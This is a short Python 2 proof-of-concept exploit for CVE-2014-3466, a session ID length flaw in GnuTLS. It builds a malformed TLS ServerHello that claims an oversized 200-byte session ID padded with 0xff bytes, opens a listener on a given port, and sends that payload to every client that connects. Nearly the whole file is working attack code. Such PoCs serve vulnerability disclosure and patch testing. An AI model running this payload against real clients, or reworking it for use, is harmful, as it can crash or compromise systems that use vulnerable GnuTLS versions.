#!/usr/bin/env python
#
# PoC for CVE-2014-3466 
# (gnutls: insufficient session id length check in _gnutls_read_server_hello)
#
# Author:   Aaron Zauner <azet@azet.org>
# License:  CC0 1.0 (https://creativecommons.org/publicdomain/zero/1.0)
#
import sys
import socket
import time

# Record Layer
R_Type          = '16'          # Handshake Protocol
R_Version       = '03 01'       # TLS 1.0
R_Length        = '00 fa'       # 250 Bytes

# Handshake Protocol: ServerHello
HS_Type         = '02'          # Handshake Type: ServerHello
HS_Length       = '00 00 f6'    # 246 Bytes
HS_Version      = '03 01'       # TLS 1.0
HS_Random       = '''
53 8b 7f 63 c1 0e 1d 72 0a b3 f8 a7 0f f5 5d 69 
65 58 42 80 c1 fb 4f db 9a aa 04 a3 d3 4b 71 c7
'''                             # Random (gmt_unix_time + random bytes)
HS_SessID_Len   = 'c8'          # Session ID Length 200 Bytes (!)
HS_SessID_Data  = '''
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
'''                             # Session ID Data (Payload)

MaliciousServerHello = (
    R_Type      + R_Version     + R_Length          + 
    HS_Type     + HS_Length     + HS_Version        + 
    HS_Random   + HS_SessID_Len + HS_SessID_Data
).replace(' ', '').replace('\n', '').decode('hex')

def main():
    try:
        PORT = int(sys.argv[1])
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('', PORT))
        sock.listen(1)
        print "-- started listener on port", PORT

        while True:
            conn, addr = sock.accept()
            print "<< client connected:", addr

            time.sleep(0.5) # wait for ClientHello :P
            if conn.send(MaliciousServerHello):
                print ">> sent payload to", addr[0]

            conn.close()
    finally:
        sock.close()

if __name__ == '__main__':
    if len(sys.argv) <= 1:
       print "  Usage:\n\tpython poc.py [port]\n"
       exit(1)

    main()

